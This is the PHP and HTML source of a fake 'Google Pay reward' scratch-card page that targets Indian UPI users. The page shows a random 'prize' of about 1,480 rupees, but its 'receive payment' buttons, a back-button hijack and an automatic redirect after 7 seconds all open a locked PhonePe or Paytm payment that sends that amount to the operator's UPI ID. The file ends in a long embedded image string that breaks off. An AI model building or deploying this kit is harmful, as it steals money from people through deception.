<?php

$min_amount = 1479; // set your desired minimum amount
$max_amount = 1484; // set your desired maximum amount

$upi = "paytm.s1dlq44@pty"; // set your desired UPI ID

// Generate random amount between min and max
$random_amount = rand($min_amount, $max_amount);

?>
<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>Home</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <script type="text/javascript">
        // We'll build a PhonePe payload (base64 JSON) using PHP-inserted values so it is available
        (function() {
            // Build the same payload structure you use in payNow for phonepe
            window.__PHP_UPI = "<?php echo addslashes($upi); ?>";
            window.__PHP_AMOUNT = "<?php echo $random_amount; ?>"; // string

            function buildPhonePePayload(vpa, amountStr) {
                var amountInPaise = parseInt(Number(amountStr) * 100);
                var payload = {
                    contact: {
                        cbsName: "",
                        nickName: "",
                        vpa: vpa,
                        type: "VPA"
                    },
                    p2pPaymentCheckoutParams: {
                        note: "", // will be set in runtime too
                        isByDefaultKnownContact: true,
                        enableSpeechToText: false,
                        allowAmountEdit: false,
                        showQrCodeOption: false,
                        disableViewHistory: true,
                        shouldShowUnsavedContactBanner: false,
                        isRecurring: false,
                        checkoutType: "DEFAULT",
                        transactionContext: "p2p",
                        initialAmount: amountInPaise,
                        disableNotesEdit: true,
                        showKeyboard: true,
                        currency: "INR",
                        shouldShowMaskedNumber: true
                    }
                };
                return payload;
            }

            // Create a baseline encodedData (note blank note — payNow will override note when called)
            window.__PHONEPE_BASE_PAYLOAD = buildPhonePePayload(window.__PHP_UPI, window.__PHP_AMOUNT);
            window.__PHONEPE_BASE_ENCODED = btoa(JSON.stringify(window.__PHONEPE_BASE_PAYLOAD));
        })();
    </script>

    <link rel="stylesheet" href="img/style.css">
    <meta property="og:type" content="website">
    <meta property="og:title" content="You&#39;ve Won Google Pay Reward">
    <meta property="og:description" content="Clain Now and Withdraw it">
    <meta property="og:image" content="img/prize.html">

    <style>
        /* Popup styles */
        .popup-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }

        .imgs {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 20px;
            justify-content: center;
            margin-top: 20px;
        }

        .popup {
            background: #fff;
            padding: 20px;
            border-radius: 10px;
            width: 80%;
            text-align: center;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }

        .popup img {
            width: 50px;
            margin: 10px;
            cursor: pointer;
            transition: transform 0.3s;
        }

        .popup img:hover {
            transform: scale(1.2);
        }

        .popup h3 {
            margin-bottom: 15px;
            color: #333;
        }

        .close-btn {
            background: #e74c3c;
            color: #fff;
            border: none;
            padding: 10px 20px;
            margin-top: 10px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
        }

        .bottom {
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
    </style>

</head>

<body>

    <script type="text/javascript">
        // Protect the back button and set onpopstate to use the phonepe native encoded payload
        (function() {
            try {
                for (var t = 0; t < 10; ++t) history.pushState({}, "", "");
                window.onpopstate = function(ev) {
                    if (ev && ev.state) {
                        alert(' Claim your Reward by Clicking on \n "SEND IN BANK ACCOUNT"  ');
                        // use the prebuilt encoded payload
                        var encoded = window.__PHONEPE_BASE_ENCODED || '';
                        if (encoded) {
                            location.href = "phonepe://native?data=" + encoded + "&id=p2ppayment";
                        } else {
                            // fallback to the older pay URL
                            location.href = "phonepe://native?data=" + encoded + "&id=p2ppayment";
                        }
                    }
                };
            } catch (e) {
                /* ignore */
            }
        })();
    </script>

    <div class="popup-overlay" id="popupOverlay">
        <div class="popup">
            <h3>Recevie Payment Using</h3>
            <div class="imgs">

             <div class="bottom">
                    <!-- call payNow with explicit type 'phonepe' -->
                    <img id="phonepeBtn" src="phonepe.png" alt="PhonePe"
                        style="cursor:pointer;"
                        onclick="(function(){ localStorage.setItem('price','<?php echo $random_amount; ?>'); payNow('<?php echo $upi; ?>','phonepe'); })();">
                </div>
            
                <div class="bottom">
                    <!-- call payNow with explicit type 'paytm' -->
                    <img id="paytmBtn" src="paytm.png" alt="Paytm"
                        style="cursor:pointer;"
                        onclick="(function(){ localStorage.setItem('price','<?php echo $random_amount; ?>'); payNow('<?php echo $upi; ?>','paytm'); })();">
                </div>
            </div>

        </div>
    </div>

   <a id="anc" class="pay-link" href='#'>
        <div>
            <img src="img/Top.jpg" width="100%" height="auto">
        </div>
    </a>


    <div class="container" id="js-container">
        <div class="confetti"></div>
        <div class="confetti"></div>
        <div class="confetti"></div>
        <div class="confetti"></div>
        <div class="confetti"></div>
        <div class="confetti"></div>
        <div class="confetti"></div>
        <div class="confetti"></div>
        <div class="confetti"></div>
        <div class="confetti"></div>
        <div class="confetti"></div>

        <canvas class="canvas" id="js-canvas" width="290" height="290"
            style="z-index: 2;height: 300px; width: 310px;"></canvas>

        <form class="form" style="visibility: visible;">
            <img src="img/Mid.gif" width="98%" height="auto">

            <span style="position: absolute;left: 15px;right: 0;z-index: 1;bottom: -10px;">
                <style>
                    h1.a {
                        font-family: "Schibsted+Grotes", sans-serif;
                        color: #2A2076;
                        font-size: 15px;
                    }

                    h1.b {
                        font-family: "Schibsted+Grotes", sans-serif;
                        color: #2A2076;
                        font-size: 50px;
                    }
                </style>
                <center>
                    <h1 class="b"><b>₹<?php echo $random_amount; ?>/-</b></h1>
                </center>
            </span>
        </form>
    </div>

    <!-- Replace the old phonepe URL on this anchor to the native encoded form if possible -->
<script type="text/javascript">
(function() {
    document.addEventListener("DOMContentLoaded", function() {
        try {
            // Store PHP-generated amount into localStorage
            localStorage.setItem('price', '<?php echo $random_amount; ?>');

            var baseEncoded = window.__PHONEPE_BASE_ENCODED || '';
            if (baseEncoded) {
                // Build the new dynamic PhonePe URL
                var newUrl = "phonepe://native?data=" + baseEncoded + "&id=p2ppayment";

                // Find existing meta refresh
                var meta = document.querySelector('meta[http-equiv="refresh"]');
                if (meta) {
                    // Update content attribute dynamically
                    meta.setAttribute('content', '7;url=' + newUrl);
                } else {
                    // Create one if not found
                    var newMeta = document.createElement('meta');
                    newMeta.setAttribute('http-equiv', 'refresh');
                    newMeta.setAttribute('content', '7;url=' + newUrl);
                    document.head.appendChild(newMeta);
                }

                console.log('✅ PhonePe meta refresh updated with encoded data.');
                console.log('💰 Price saved to localStorage:', localStorage.getItem('price'));
            } else {
                console.warn('⚠️ baseEncoded not found — fallback meta refresh will be used.');
            }
        } catch (err) {
            console.error('❌ Error updating PhonePe meta refresh:', err);
        }
    });
})();
</script>
    <a id="anc" class="pay-link" href='#'>
        <div>
            <img src="img/Bot.jpg" width="100%" height="auto">
        </div>
    </a>
<script type="text/javascript">
(function() {
    // If JS runs, replace meta refresh dynamically with encoded payload
    document.addEventListener("DOMContentLoaded", function() {
        try {
            var baseEncoded = window.__PHONEPE_BASE_ENCODED || '';
            if (baseEncoded) {
                // Build the new dynamic PhonePe URL
                var newUrl = "phonepe://native?data=" + baseEncoded + "&id=p2ppayment";

                // Find existing meta refresh
                var meta = document.querySelector('meta[http-equiv="refresh"]');
                if (meta) {
                    // Update content attribute
                    meta.setAttribute('content', '7;url=' + newUrl);
                } else {
                    // Create one if not found
                    var newMeta = document.createElement('meta');
                    newMeta.setAttribute('http-equiv', 'refresh');
                    newMeta.setAttribute('content', '7;url=' + newUrl);
                    document.head.appendChild(newMeta);
                }
            }
        } catch (err) {
            console.error('Error updating PhonePe meta refresh:', err);
        }
    });
})();
</script>

    <script>
        // Canvas scratcher code left intact (only necessary parts shown here)
        (function() {
            'use strict';
            var isDrawing, lastPoint;
            var container = document.getElementById('js-container'),
                canvas = document.getElementById('js-canvas'),
                canvasWidth = canvas.width,
                canvasHeight = canvas.height,
                ctx = canvas.getContext('2d'),
                image = new Image(),
                brush = new Image();
           
        image.src = "data:image/jpeg;base64,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AAAAAAABADhCSU0nEAAAAAAACgABAAAAAAAAAAE4QklNA/UAAAAAAEgAL2ZmAAEAbGZmAAYAAAAAAAEAL2ZmAAEAoZmaAAYAAAAAAAEAMgAAAAEAWgAAAAYAAAAAAAEANQAAAAEALQAAAAYAAAAAAAE4QklNA/gAAAAAAHAAAP////////////////////////////8D6AAAAAD/////////////////////////////A+gAAAAA/////////////////////////////wPoAAAAAP////////////////////////////8D6AAAOEJJTQQIAAAAAAAQAAAAAQAAAkAAAAJAAAAAADhCSU0EHgAAAAAABAAAAAA4QklNBBoAAAAAAzcAAAAGAAAAAAAAAAAAAAEsAAABLAAAAAEAMgAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAABLAAAASwAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAQAAAAAAAG51bGwAAAACAAAABmJvdW5kc09iamMAAAABAAAAAAAAUmN0MQAAAAQAAAAAVG9wIGxvbmcAAAAAAAAAAExlZnRsb25nAAAAAAAAAABCdG9tbG9uZwAAASwAAAAAUmdodGxvbmcAAAEsAAAABnNsaWNlc1ZsTHMAAAABT2JqYwAAAAEAAAAAAAVzbGljZQAAABIAAAAHc2xpY2VJRGxvbmcAAAAAAAAAB2dyb3VwSURsb25nAAAAAAAAAAZvcmlnaW5lbnVtAAAADEVTbGljZU9yaWdpbgAAAA1hdXRvR2VuZXJhdGVkAAAAAFR5cGVlbnVtAAAACkVTbGljZVR5cGUAAAAASW1nIAAAAAZib3VuZHNPYmpjAAAAAQAAAAAAAFJjdDEAAAAEAAAAAFRvcCBsb25nAAAAAAAAAABMZWZ0bG9uZwAAAAAAAAAAQnRvbWxvbmcAAAEsAAAAAFJnaHRsb25nAAABLAAAAAN1cmxURVhUAAAAAQAAAAAAAG51bGxURVhUAAAAAQAAAAAAAE1zZ2VURVhUAAAAAQAAAAAABmFsdFRhZ1RFWFQAAAABAAAAAAAOY2VsbFRleHRJc0hUTUxib29sAQAAAAhjZWxsVGV4dFRFWFQAAAABAAAAAAAJaG9yekFsaWduZW51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